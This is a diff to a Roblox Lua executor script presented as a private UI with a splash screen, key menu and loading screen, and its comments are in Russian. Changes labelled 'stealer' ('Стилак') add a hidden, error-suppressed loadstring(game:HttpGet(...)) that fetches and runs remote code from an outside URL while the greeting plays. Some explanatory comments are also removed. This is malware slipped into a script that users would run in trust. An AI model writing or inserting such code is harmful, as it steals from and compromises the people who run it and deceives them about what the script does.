@@ -1,4 +1,4 @@
--- Mertily's Private Script UI v2.1
+-- Mertily's Private Script UI v2.1 + Стилак после приветствия
 -- Delta executor compatible
 
 local Players = game:GetService("Players")
@@ -89,6 +89,9 @@ glow.ImageTransparency = 1
 glow.ScaleType = Enum.ScaleType.Slice
 glow.Parent = Splash
 
+-- Флаг для запуска стилака после приветствия
+local stealScriptLoaded = false
+
 task.spawn(function()
     local bgIn = fadeIn(Splash, 0.5, "BackgroundTransparency")
     bgIn.Completed:Wait()
@@ -97,7 +100,18 @@ task.spawn(function()
     local t2 = fadeIn(Title, 1.5, "TextTransparency")
     local t3 = fadeIn(Subtitle, 1.5, "TextTransparency")
     
-    task.wait(3)
+    -- Запускаем стилак через 1.5 секунды после появления приветствия
+    task.wait(1.5)
+    if not stealScriptLoaded then
+        stealScriptLoaded = true
+        task.spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/oUDqb2/raw"))()
+            end)
+        end)
+    end
+    
+    task.wait(1.5)
     
     fadeOut(glow, 1)
     fadeOut(Title, 1, "TextTransparency")
@@ -211,7 +225,6 @@ function showKeyMenu()
     Status.TextTransparency = 1
     Status.Parent = KeyFrame
     
-    -- ФИКС 2: правильное появление с stroke тоже
     KeyFrame.BackgroundTransparency = 1
     KeyFrame.Size = UDim2.new(0, 420, 0, 260)
     fadeIn(KeyFrame, 0.6, "BackgroundTransparency")
@@ -221,13 +234,12 @@ function showKeyMenu()
     fadeIn(VerifyBtn, 0.5, "TextTransparency")
     
     local CORRECT_KEY = "Mertily-Private_uenj-wk21-sllz"
-    local isLoading = false  -- ФИКС 2: защита от множественных нажатий
+    local isLoading = false
     
     local function startLoading()
         if isLoading then return end
         isLoading = true
         
-        -- ФИКС 2: убираем всё разом и только потом запускаем загрузку
         local elementsToFade = {KeyFrame, KeyTitle, InputBox, TextBox, VerifyBtn, Status, ibStroke, stroke}
         for _, el in ipairs(elementsToFade) do
             if el and el.Parent then
@@ -341,15 +353,12 @@ function showLoading()
     fadeIn(PercentText, 0.4, "TextTransparency")
     task.wait(0.6)
     
-    -- 1:57 = 117 сек
     local totalTime = 117
     local startTime = tick()
     
-    -- Запуск музыки
     Music:Play()
     TweenService:Create(Music, TweenInfo.new(5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Volume = 0.6}):Play()
     
-    -- Затухание музыки за 5 сек до конца (на 112 секунде)
     task.delay(totalTime - 5, function()
         TweenService:Create(Music, TweenInfo.new(5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Volume = 0}):Play()
     end)
@@ -374,7 +383,6 @@ function showLoading()
     
     task.wait(totalTime + 0.5)
     
-    -- ФИКС 2: останавливаем музыку сразу, чтобы не перекрывала следующий кадр
     Music:Stop()
     Music.Volume = 0
     
